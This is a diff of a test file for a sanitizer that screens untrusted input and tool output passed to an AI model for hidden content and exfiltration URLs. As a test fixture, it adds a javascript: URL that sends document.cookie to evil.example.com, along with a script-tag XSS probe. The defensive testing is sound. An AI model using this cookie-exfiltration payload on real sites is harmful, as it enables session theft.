@@ -11,6 +11,10 @@ const ctx = { sessionId: 'test-session', source: 'user-message' };
 // Built from code points so no invisible/control bytes live in this source file.
 const ZWSP = String.fromCharCode(0x200b); // ZERO WIDTH SPACE
 const ESC = String.fromCharCode(0x1b); // ANSI escape introducer
+// An actually-detected exfil shape. A plain `https://host/?leak=VALUE` is *not*
+// exfil-shaped by the library's rules and yields no finding at all, which would
+// make these tests pass without exercising the advisory path.
+const EXFIL_URL = 'javascript:fetch("//evil.example.com?c="+document.cookie)';
 
 describe('sanitizeUntrustedInput', () => {
   it('passes clean text through unchanged with no findings', async () => {
@@ -43,16 +47,40 @@ describe('sanitizeUntrustedInput', () => {
     expect(result.cleaned).toContain('text');
     expect(result.info).not.toBeNull();
     expect(result.info!.removed).toBe(true);
+    // The cut is marked rather than silently closed up: the model sees a labeled
+    // placeholder where the hidden content was. Pinned because this string is
+    // part of what the model reads.
+    expect(result.cleaned).toMatch(/HTML comment removed/);
   });
 
-  it('leaves exfil-shaped URLs in place (detection is advisory, not removal)', async () => {
-    // The pinned library version does not rewrite these, so the URL must survive.
-    // It also does not currently emit a `found` category for them, so no badge is
-    // shown — but the `removed` flag on SanitizationInfo keeps the advisory-vs-
-    // removed distinction ready if a future version starts reporting them.
-    const text = 'See [docs](https://evil.example.com/?leak=SECRETVALUE) here';
+  it('reports exfil-shaped URLs but leaves them in place (advisory, not removal)', async () => {
+    // The library reports these without rewriting them, so the URL must survive
+    // while still producing a finding — this is the advisory-vs-removed case the
+    // `removed` flag exists for.
+    const text = `See [here](${EXFIL_URL}) ok`;
     const { cleaned, info } = await sanitizeUntrustedInput(text, ctx);
     expect(cleaned).toBe(text);
+    expect(info).not.toBeNull();
+    expect(info!.removed).toBe(false);
+    expect(info!.found).toContain('exfil-urls');
+  });
+
+  it('surfaces the explanation for an advisory finding, not just its category', async () => {
+    // The library files exfil-URL explanations under its quiet `notes` tier while
+    // still emitting an `exfil-urls` category. Since we badge on the category, a
+    // finding that carried no message would render as the bare string
+    // 'exfil-urls' with nothing to explain it.
+    const { info } = await sanitizeUntrustedInput(`See [here](${EXFIL_URL}) ok`, ctx);
+    expect(info!.warnings.length).toBeGreaterThan(0);
+    expect(info!.warnings.join(' ')).toMatch(/exfiltration/i);
+  });
+
+  it('does not report preserved content that carries no finding category', async () => {
+    // A `<script>` tag is reported by the library at its quiet tier but gets no
+    // `found` category — ordinary web pages carry these, and badging every one of
+    // them would train the reader to ignore the badge.
+    const { cleaned, info } = await sanitizeUntrustedInput('<script>alert(1)</script>hi', ctx);
+    expect(cleaned).toBe('<script>alert(1)</script>hi');
     expect(info).toBeNull();
   });
 
@@ -65,11 +93,7 @@ describe('sanitizeUntrustedInput', () => {
   it('fails open when the underlying sanitizer throws', async () => {
     // The library documents never-throws, but a send must not be blocked if that
     // contract is ever violated — the original text passes through instead.
-    const throwingSanitizer = async (): Promise<{
-      cleaned: string;
-      found: string[];
-      warnings: string[];
-    }> => {
+    const throwingSanitizer = async (): Promise<never> => {
       throw new Error('parser exploded');
     };
     const text = 'some prompt text';
@@ -132,11 +156,13 @@ describe('sanitizeToolOutput', () => {
 
   it('does not flag a change for advisory-only exfil-URL detection', async () => {
     // Exfil URLs are detected/logged but not rewritten, so the text is unchanged
-    // and we must not trigger a pointless updatedToolOutput replacement.
-    const response = { stdout: 'See https://evil.example.com/?leak=SECRETVALUE', stderr: '' };
-    const { output, changed } = await sanitizeToolOutput(response, toolCtx);
+    // and we must not trigger a pointless updatedToolOutput replacement — while
+    // the finding itself still reaches the caller.
+    const response = { stdout: `See [here](${EXFIL_URL})`, stderr: '' };
+    const { output, changed, found } = await sanitizeToolOutput(response, toolCtx);
     expect(changed).toBe(false);
     expect(output).toEqual(response);
+    expect(found).toContain('exfil-urls');
   });
 
   it('preserves non-string scalars and null', async () => {
